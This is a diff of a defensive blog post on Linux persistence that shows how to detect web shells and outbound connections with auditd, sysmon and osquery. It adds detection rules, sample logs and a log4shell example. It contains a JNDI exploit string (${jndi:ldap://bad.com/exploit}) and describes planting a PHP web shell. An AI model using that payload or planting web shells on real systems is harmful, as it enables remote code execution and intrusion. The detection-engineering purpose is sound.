@@ -28,7 +28,7 @@ Each persistence technique has two main parts:
 1.  How to deploy the persistence techniques
 2.  How to monitor and detect persistence techniques
 
-In this blog post we will only discuss web shell but we will be focusing more on logging and monitoring. We will discuss other techniques in succeeding posts. 
+In this blog post, we will be focusing more on logging and monitoring, and simply use web shells as an initial example. The rest of the techniques  will discuss other techniques in succeeding posts. 
 
 The diagram above gives an overview of what will be discussed in this series. _[\[pdf version\]](/assets/posts/common/20220201-linux-persistence.pdf)_
 
@@ -70,7 +70,7 @@ After successfully gaining access to the machine, they need to pivot through the
 
 ![](https://cdn-images-1.medium.com/max/800/1*0wxC57JISeSG-smadvc1eQ.png)
 
-During these post exploitation activities, the the attacker’s connection to the machine can be severed, and to regain access, the attacker might need to repeat the exploitation step. 
+During these post exploitation activities, the attacker’s connection to the machine can be severed, and to regain access, the attacker might need to repeat the exploitation step. 
 
 Redoing the exploitation might be difficult depending on the attacker vector:
 
@@ -80,11 +80,11 @@ Redoing the exploitation might be difficult depending on the attacker vector:
 
 ![](https://cdn-images-1.medium.com/max/800/1*IrrpPyzrBA9E3EBQ5ecaGg.png)
 
-Because of how difficult the exploitation can be, an attacker would want to make the most out of their initial access. To do this, they install backdoor access that reliably maintain access to the compromised machine even after reboots. 
+Because of how difficult the exploitation can be, an attacker would want to make the most out of their initial access. To do this, they install backdoor access that reliably maintains access to the compromised machine even after reboots. 
 
 ![](https://cdn-images-1.medium.com/max/800/1*4qWkg11a6uCfMirnUnrxeQ.png)
 
-With persistence installed, the attacker no longer need to rely on exploitation to regain access to the system. He might simply use the added account in the machine or wait for the reverse shell from a installed service.
+With persistence installed, the attacker no longer needs to rely on exploitation to regain access to the system. He might simply use the added account in the machine or wait for the reverse shell from an installed service.
 
 ### 0 Linux Logging and Auditing
 
@@ -115,7 +115,7 @@ Each of these tools requires you to configure rules for it to generate meaningfu
 *   [https://github.com/Neo23x0/auditd](https://github.com/Neo23x0/auditd)
 *   [https://github.com/microsoft/MSTIC-Sysmon/tree/main/linux](https://github.com/microsoft/MSTIC-Sysmon/tree/main/linux)
 
-For instructions how to install sysmon refer to _appendix A01._
+For instructions on how to install sysmon refer to _appendix A01._
 
 ##### 0.2.2 Comparison of sysmon and auditd
 
@@ -126,16 +126,16 @@ I'm using `sysmonforlinux/buster,now 1.0.0`
 While doing the research for this blogpost, my comments so far are:
 - **sysmon's rule definitions are much more flexible and expressive than auditd's**
 - Just like other rules using string matching, rules depending on user input fields such as `CommandLine` can be bypassed.
-- **File integrity monitoring is a weakness for SysmonForLinux 1.0.0.** In my testing, sysmon only has the event FileCreate which is triggered only when creating or overwriting of files. This means that file modification is not caught by Sysmon (such as appending to files). 
+- **File integrity monitoring is a weakness for SysmonForLinux 1.0.0.** In my testing, sysmon only has the event FileCreate which is triggered only when creating or overwriting files. This means that file modification is not caught by Sysmon (such as appending to files). 
 - I've experienced some problems with the truncated rule title displayed in the logs.
-- Auditd rules can filter up to the syscall level and sysmon filters based on highlevel predfined events such as `ProcessCreation`, and `FileCreate`. This means that if a particular activity that you are looking for is not mapped to a sysmon event, then you might have a hard time using sysmon to watch for it.
+- Auditd rules can filter up to the syscall level and sysmon filters based on high level predefined events such as `ProcessCreation`, and `FileCreate`. This means that if a particular activity that you are looking for is not mapped to a sysmon event, then you might have a hard time using sysmon to watch for it.
 
 
-**Overall, I'm very optimistic with using adopting sysmon for linux in the future to look for interesting processes and connections but would still rely on other tools for file integrity monitoring such as auditd or auditbeats.**
+**Overall, I'm very optimistic about adopting sysmon for linux in the future to look for interesting processes and connections but would still rely on other tools for file integrity monitoring such as auditd or auditbeats.**
 
 In windows, having only `FileCreate` is okay since you have other events specific to configuration changes, such as  `RegistryEvent` for registry keys, but in Linux since all of the configurations are essentially files, then file integrity monitoring plays a much bigger role in hunting for changes in system configurations.
 
-The good thing with sysmon, is that rules for network activities and process creation is much more expressive. It's more intuitive than trying to use auditd's `a0`, `a1`, ... for match on command line arguments.
+The good thing with sysmon, is that rules for network activities and process creation are much more expressive. It's more intuitive than trying to use auditd's `a0`, `a1`, ... for match on command line arguments.
 
 
 We will discuss some of the findings in the next blog posts but some examples of bypasses are:
@@ -153,16 +153,16 @@ We see from the diagram from `linuxsecurity.com` that Sysmon works on top of eBP
 _Image from "Lead Microsoft Engineer Kevin Sheldrake Brings Sysmon to Linux"[2]_
 
 
-For example, in sysmon, we can look for a FileCreate event with a specific `TargetFilename`. This is more flexible because you can define rules based on patterns or keywords and look for files that do no exist yet. However, string matches such as `/etc/passwd` can fail if the target name is not exactly that string.
+For example, in sysmon, we can look for a FileCreate event with a specific `TargetFilename`. This is more flexible because you can define rules based on patterns or keywords and look for files that don't exist yet. However, string matches such as `/etc/passwd` can fail if the target name is not exactly that string.
 
-Unlike in auditd, what is being watched are actions on the inodes of the files and directories. This means that there is no ambiguity on which specific files needs to be monitored. You can even look for read access to specific files. However, because it watches based on inodes, the files have to exist when the auditd service is started. This means you cannot watch files based on certain patterns like `*/.ssh/authorized_keys` 
+On the other hand, auditd watches for actions on the inodes of the files and directories. This means that there is no ambiguity on which specific files need to be monitored. You can even look for read access to specific files. However, because it watches based on inodes, the files have to exist when the auditd service is started. This means you cannot watch files based on certain patterns like `*/.ssh/authorized_keys` 
 
 
 #### 0.3 osquery
 
 Osquery allows us to investigate our endpoints using SQL queries. This simplifies the task of investigating and collecting evidence.
 
-Moreover, when paired with management interface like [fleetdm](https://github.com/fleetdm/fleet) allows you to take baselines of your environments and even hunt for adversaries.
+Moreover, when paired with a management interface like [fleetdm](https://github.com/fleetdm/fleet) allows you to take baselines of your environments and even hunt for adversaries.
 
 An example from a future blog post is looking for accounts that have a password set. If you expect your engineers to always SSH via public key, then you should not see active passwords.
 
@@ -199,7 +199,7 @@ Once installed simply run `osqueryi` and run the SQL queries.
 
 **MITRE**: [https://attack.mitre.org/techniques/T1505/003/](https://attack.mitre.org/techniques/T1505/003/)
 
-A web shell is backdoor installed in a web server by an attacker. Once installed, it becomes the initial foothold of the attacker, and if it’s never detected, then it becomes an easy persistent backdoor.
+A web shell is a backdoor installed in a web server by an attacker. Once installed, it becomes the initial foothold of the attacker, and if it’s never detected, then it becomes an easy persistent backdoor.
 
 In our example, to install a web shell we add a bad `.php` file inside`/var/www/html` Some reasons this can happen are:
 
@@ -211,7 +211,7 @@ If the attacker can upload malicious files that run as php, then he can get remo
 
 One famous example of this is the [2017 Equifax Data Breach](https://republicans-oversight.house.gov/wp-content/uploads/2018/12/Equifax-Report.pdf). You can read the report, but here’s my TLDR: 
 
-> The web server was running Apache Struts containing a critical RCE vulnerability. Attackers used this RCE to drop web shells which they used to gain access to sensitive data and exfiltrate the data. Around 30 different web shells was used in the breach.
+> The web server was running Apache Struts containing a critical RCE vulnerability. Attackers used this RCE to drop web shells which they used to gain access to sensitive data and exfiltrate the data. Around 30 different web shells were used in the breach.
 
 See the following resources:
 
@@ -222,7 +222,7 @@ See the following resources:
 
 _Note: If you want to try this out you can follow the setup instructions in the appendix A00._
 
-Assume we already have RCE, we add a file `phpinfo.php` that will contain our web shell.
+Assuming we already have RCE, we add a file `phpinfo.php` that will contain our web shell.
 
 ```
 vi /var/www/html/phpinfo.php
@@ -523,9 +523,155 @@ For more information about writing your own sysmon rules you can look at:
 *   [https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml](https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml)
 *   [https://github.com/microsoft/MSTIC-Sysmon](https://github.com/microsoft/MSTIC-Sysmon)
 
-#### 1.6 Hunting for web shells using osquery
+#### 1.6 Detection: Looking for initiated connections by www-data 
 
-For osquery, we might not be able to "find" the web shells itself, but we might be able to find evidence of the webshell. If an attacker uses a web shell, it is possible they will try to establish a reverse shell. If so, we should be an outbound connection from the web server to the attacker. 
+If your web server is not expected to create outbound connections, then we can monitor outbound connections created by the `www-data` user.
+
+Some reasons an attacker might do this are:
+- Downloading additional scripts and tools
+- Establishing a reverse shell
+- Moving laterally by accessing other machines through the web shell
+
+#### 1.6.1 auditd
+
+
+Referencing [\[4\]](https://www.linkedin.com/pulse/using-auditd-monitor-network-connections-alex-maestretti/), we can us auditd to look for IP connections created by `www-data` (Replace `euid` for other users).
+```
+-a always,exit -F arch=b32 -S socket -F a0=10 -F euid=33 -k www_data_connect
+-a always,exit -F arch=b64 -S socket -F a0=10 -F euid=33 -k www_data_connect
+-a always,exit -F arch=b32 -S socket -F a0=2 -F euid=33  -k www_data_connect
+-a always,exit -F arch=b64 -S socket -F a0=2 -F euid=33  -k www_data_connect
+```
+
+For example, if we use our web shell to `curl https://www.google.com` we get this auditd log.
+
+<pre class='highlight' style="white-space:pre;"><code style="white-space:pre;">
+SYSCALL arch=c000003e syscall=41 success=yes exit=3 a0=a a1=80002 a2=0 a3=7f33e33ad394 items=0 ppid=24271 pid=24272 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm="curl" <b><u>exe="/usr/bin/curl"</u></b> subj==unconfined <b><u>key="www_data_connect"</u></b>
+PROCTITLE proctitle=6375726C0068747470733A2F2F7777772E676F6F676C652E636F6D
+</code></pre>
+
+As you can see, the log does not include IP metadata such as destination port and destination IP address. This would make it difficult to exclude some known connections the webserver might make, such as connections to a DB.
+
+#### 1.6.2 sysmon
+
+In sysmon we can use the following rule
+
+```xml
+ <NetworkConnect onmatch="include">
+    <Rule name="www_data_connect" groupRelation="or">
+        <User condition="end with">www-data</User>
+    </Rule>
+</NetworkConnect>
+```
+
+And we get the following output (removed some fields for brevity):
+```xml
+<Event>
+    <System>
+        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>
+        <EventID>3</EventID>
+    </System>
+    <EventData>
+        <Data Name="RuleName">www_data_connect</Data>
+        <Data Name="Image">/usr/bin/curl</Data>
+        <Data Name="User">www-data</Data>
+        <Data Name="Protocol">tcp</Data>
+        <Data Name="Initiated">true</Data>
+        <Data Name="SourceIsIpv6">false</Data>
+        <Data Name="SourceIp">10.2.0.29</Data>
+        <Data Name="SourceHostname">-</Data>
+        <Data Name="SourcePort">57774</Data>
+        <Data Name="SourcePortName">-</Data>
+        <Data Name="DestinationIsIpv6">false</Data>
+        <Data Name="DestinationIp">64.233.191.105</Data>
+        <Data Name="DestinationHostname">-</Data>
+        <Data Name="DestinationPort">443</Data>
+        <Data Name="DestinationPortName">-</Data>
+    </EventData>
+</Event>
+```
+
+Notice that the output of sysmon has useful fields like `DestinationIp` that might allow us to fine tune rules to exclude connections.
+
+
+##### 1.6.3 Example: log4shell 
+
+Although strictly, not a webshell or persistence. This is a good example where sysmon's flexibility shines.
+
+Run the vulnerable app through docker found [christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app). This would also require you to exploit POC described in the repo. 
+
+See [Critical RCE Vulnerability: log4j - CVE-2021-44228 \[5\]](https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java) for complete details. Briefly, the vulnerability is caused by a malicious string such as 
+
+```
+${jndi:ldap://bad.com/exploit}
+```
+
+This causes the application to fetch the remote java object and execute it. This is an example of a case where outbound connections by the java applications might be an indicator of exploitation. We can use `auditd` and `sysmon` to look for network connections initiated by the app running on docker. 
+
+##### 1.6.3.1 auditd
+
+Because of how docker runs, the container and application will run as root. So if we look for new connections made by the app, we will need to look for connections created by `root` 
+
+```
+-a always,exit -F arch=b32 -S socket -F euid=0 -F a0=2  -k root_connection
+-a always,exit -F arch=b32 -S socket -F euid=0 -F a0=10 -k root_connection
+-a always,exit -F arch=b64 -S socket -F euid=0 -F a0=2  -k root_connection
+-a always,exit -F arch=b64 -S socket -F euid=0 -F a0=10 -k root_connection
+```
+
+This will result in the following logs
+
+```
+SYSCALL arch=c000003e syscall=41 success=yes exit=23 a0=2 a1=1 a2=0 a3=0 items=0 ppid=26165 pid=26183 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="java" exe="/usr/lib/jvm/java-1.8-openjdk/jre/bin/java" subj==docker-default (enforce) key="root_connection"
+PROCTITLE proctitle=6A617661002D6A6172002F6170702F737072696E672D626F6F742D6170706C69636174696F6E2E6A6172
+```
+
+Althought this catches the exploit, it also catches other normal network connections root might make. What if we want to filter only for connections created by "java". I don't think you can do this with `auditd`'s filters although I may be wrong.
+
+##### 1.6.3.1 sysmon
+
+In sysmon, this would be much easier to do
+
+```xml
+<Rule name="log4shell" groupRelation="and">
+    <Protocol condition="is">tcp</Protocol> 
+    <Image condition="end with">java</Image>
+</Rule>
+```
+
+And this results in the following log (removed some fields for brevity)
+
+```xml
+<?xml version="1.0"?>
+<Event>
+  <System>
+    <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>
+    <EventID>3</EventID>
+  </System>
+  <EventData>
+    <Data Name="Image">/usr/lib/jvm/java-1.8-openjdk/jre/bin/java</Data>
+    <Data Name="User">root</Data>
+    <Data Name="Protocol">tcp</Data>
+    <Data Name="Initiated">true</Data>
+    <Data Name="SourceIsIpv6">false</Data>
+    <Data Name="SourceIp">172.17.0.2</Data>
+    <Data Name="SourceHostname">-</Data>
+    <Data Name="SourcePort">40378</Data>
+    <Data Name="SourcePortName">-</Data>
+    <Data Name="DestinationIsIpv6">false</Data>
+    <Data Name="DestinationIp">10.2.0.29</Data>
+    <Data Name="DestinationHostname">-</Data>
+    <Data Name="DestinationPort">1389</Data>
+    <Data Name="DestinationPortName">-</Data>
+  </EventData>
+</Event>
+```
+
+
+
+#### 1.7 Hunting for web shells using osquery
+
+For osquery, we might not be able to "find" the web shells itself, but we might be able to find evidence of the webshell. If an attacker uses a web shell, it is possible they will try to establish a reverse shell. If so, there should be an outbound connection from the web server to the attacker. 
 
 ```sql
 SELECT pid, remote_address, local_port, remote_port, s.state, p.name, p.cmdline, p.uid, username  
@@ -563,9 +709,9 @@ What should catch your eye is the connection `pid =17776`. It is an outbound con
 
 ### What’s next
 
-We’ve discussed basic of monitoring and logging with sysmon, osqueryu, auditd and auditbeats and we have used the case study of how to detect the creation and usage of web shells.
+We’ve discussed basics of monitoring and logging with sysmon, osqueryu, auditd and auditbeats and we have used the case study of how to detect the creation and usage of web shells. 
 
-In the next blog post we will go through account creation and manipulation.
+There are a lot more techinques we can discuss in depth. Go back to the overview to see the list of the topics of the following blog posts.
 
 ### Appendix
 
@@ -703,6 +849,8 @@ For some of the custom rules I make I add it in `/etc/auditbeat/audit.rules.d/cu
 - [1] [https://github.com/elastic/integrations/issues/1930](https://github.com/elastic/integrations/issues/1930)
 - [2] [Lead Microsoft Engineer Kevin Sheldrake Brings Sysmon to Linux](https://linuxsecurity.com/features/lead-microsoft-engineer-kevin-sheldrake-brings-sysmon-to-linux)
 - [3] [Redhat CHAPTER 7. SYSTEM AUDITING](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing)
+- [4] [Using Auditd to Monitor Network Connections](https://www.linkedin.com/pulse/using-auditd-monitor-network-connections-alex-maestretti/)
+- [5] [Critical RCE Vulnerability: log4j - CVE-2021-44228](https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java) 
 
 -----
 
